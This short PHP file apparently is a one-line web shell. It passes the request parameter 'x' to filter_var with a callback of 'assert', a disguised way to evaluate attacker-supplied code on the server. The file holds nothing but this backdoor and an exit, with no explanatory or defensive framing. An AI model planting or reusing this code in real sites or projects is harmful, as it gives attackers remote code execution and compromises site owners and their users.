<?php
    filter_var($_REQUEST['x'], FILTER_CALLBACK, array('options' => 'assert'));
	
	exit;
?>